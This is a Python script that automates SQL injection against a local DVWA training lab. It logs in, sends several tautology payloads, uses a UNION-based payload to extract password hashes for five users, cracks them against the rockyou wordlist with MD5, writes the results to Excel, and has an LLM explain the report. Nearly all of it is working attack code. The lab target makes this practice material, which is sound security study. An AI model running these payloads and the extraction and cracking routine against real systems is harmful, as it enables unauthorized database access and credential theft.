import requests
from bs4 import BeautifulSoup
import pandas as pd
from collections import defaultdict
import os
from docx import Document
import hashlib

# DVWA settings
BASE_URL = "http://localhost/DVWA"
LOGIN_URL = f"{BASE_URL}/login.php"
SQLI_URL = f"{BASE_URL}/vulnerabilities/sqli/"
USERNAME = "admin"
PASSWORD = "password"

# OpenRouter DeepSeek API settings
API_URL = 'https://openrouter.ai/api/v1/chat/completions'
MODEL = "deepseek/deepseek-r1-0528:free"

def get_openrouter_explanation(prompt):
    # Read API key from key.txt if present
    api_key = None
    if os.path.exists("key.txt"):
        with open("key.txt", "r") as f:
            api_key = f.read().strip()
    if not api_key:
        api_key = os.getenv("OPENROUTER_API_KEY")
    if not api_key:
        return "OpenRouter API key not set. Please set OPENROUTER_API_KEY environment variable or provide key.txt."
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    data = {
        "model": MODEL,
        "messages": [
            {"role": "system", "content": "You are an expert security report assistant."},
            {"role": "user", "content": prompt}
        ]
    }
    try:
        response = requests.post(API_URL, headers=headers, json=data, timeout=30)
        response.raise_for_status()
        result = response.json()
        return result["choices"][0]["message"]["content"].strip()
    except Exception as e:
        return f"OpenRouter API error: {e}"

# Start a session
session = requests.Session()

# Step 1: Get login page to fetch CSRF token
login_page = session.get(LOGIN_URL)
soup = BeautifulSoup(login_page.text, "html.parser")
token_input = soup.find("input", {"name": "user_token"})
user_token = token_input["value"] if token_input else ""

# Step 2: Login
login_data = {
    "username": USERNAME,
    "password": PASSWORD,
    "Login": "Login",
    "user_token": user_token
}
login_response = session.post(LOGIN_URL, data=login_data)

# Check for successful login by looking for 'Logout' or username in the response
if ("Login failed" in login_response.text or
    ("Logout" not in login_response.text and USERNAME not in login_response.text)):
    print("Login failed or not authenticated. Check credentials, CSRF token, or DVWA security level.")
    print("--- Login page content for debugging ---")
    print(login_response.text)
    exit(1)

# Step 3: Try multiple SQLi payloads and save raw responses
payloads = [
    "1' OR '1'='1",           # Classic
    "1' OR 1=1-- -",          # With comment
    "1' OR TRUE-- -",         # TRUE literal
    "1' OR 1=1#",             # With hash comment
    "1' OR 1=1/*",            # With C-style comment
]
results_by_payload = defaultdict(list)

for payload in payloads:
    params = {"id": payload, "Submit": "Submit"}
    sqli_response = session.get(SQLI_URL, params=params)
    soup = BeautifulSoup(sqli_response.text, "html.parser")
    first_name = None
    surname = None
    for pre in soup.find_all("pre"):
        # Use get_text(separator="\n") to handle <br /> as newlines
        lines = pre.get_text(separator="\n").strip().split("\n")
        for line in lines:
            if line.lower().startswith("first name:"):
                first_name = line.split(":", 1)[1].strip()
            elif line.lower().startswith("surname:"):
                surname = line.split(":", 1)[1].strip()
            if first_name and surname:
                results_by_payload[payload].append({
                    "First Name": first_name,
                    "Surname": surname
                })
                first_name = None
                surname = None

# Step 4: Export to Excel, all payloads on the same worksheet, grouped
all_rows = []
for payload, entries in results_by_payload.items():
    for entry in entries:
        all_rows.append({
            "Payload": payload,
            "First Name": entry["First Name"],
            "Surname": entry["Surname"]
        })

if all_rows:
    prompt = (
        "Explain the results of a DVWA SQL Injection automation report. "
        "Sheet 'Users' shows the results of various SQLi payloads, listing the first name and surname fields returned for each payload. "
        "Sheet 'Passwords' demonstrates a UNION-based SQL injection to extract the password hash for each user (IDs 1-5). "
        "The password is shown in the 'First Name' column where the injected Surname is 'x'."
    )
    explanation_text = get_openrouter_explanation(prompt)
    # Save explanation to a Word file
    def save_explanation_to_word(explanation_text, filename="dvwa_sqli_explanation.docx"):
        doc = Document()
        doc.add_heading("DVWA SQL Injection Automated Report Explanation", 0)
        doc.add_paragraph(explanation_text)
        doc.save(filename)
    save_explanation_to_word(explanation_text)
    with pd.ExcelWriter("dvwa_sqli_report.xlsx") as writer:
        df1 = pd.DataFrame(all_rows)
        df1 = df1[["Payload", "First Name", "Surname"]]
        df1.to_excel(writer, sheet_name="Users", index=False)

        # Step 5: Extract passwords for user IDs 1-5 using UNION-based SQLi (corrected payload)
        results = []
        for user_id in range(1, 6):
            payload = f"{user_id}' UNION SELECT password, 'x' FROM users WHERE user_id={user_id}-- -"
            params = {"id": payload, "Submit": "Submit"}
            sqli_response = session.get(SQLI_URL, params=params)
            soup = BeautifulSoup(sqli_response.text, "html.parser")
            for pre in soup.find_all("pre"):
                lines = pre.get_text(separator="\n").strip().split("\n")
                first_name = None
                surname = None
                for line in lines:
                    if line.lower().startswith("first name:"):
                        first_name = line.split(":", 1)[1].strip()
                    elif line.lower().startswith("surname:"):
                        surname = line.split(":", 1)[1].strip()
                if surname == 'x' and first_name:
                    results.append({
                        "User ID": user_id,
                        "Password": first_name,
                        "Payload": payload
                    })
                    break
        if results:
            def crack_md5_hash(md5_hash, wordlist_path="rockyou.txt"):
                try:
                    with open(wordlist_path, "r", encoding="utf-8") as f:
                        for pwd in f:
                            pwd = pwd.strip()
                            if pwd and hashlib.md5(pwd.encode()).hexdigest() == md5_hash:
                                return pwd
                except Exception as e:
                    return f"(error: {e})"
                return "(not cracked)"
            for row in results:
                row["Cracked Password"] = crack_md5_hash(row["Password"])
            df2 = pd.DataFrame(results)
            df2 = df2[["User ID", "Password", "Cracked Password", "Payload"]]
            df2.to_excel(writer, sheet_name="Passwords", index=False)
        print("Report exported to dvwa_sqli_report.xlsx (Users and Passwords sheets)")
else:
    print("No first names/surnames found. Try adjusting the payloads or check DVWA security level.")
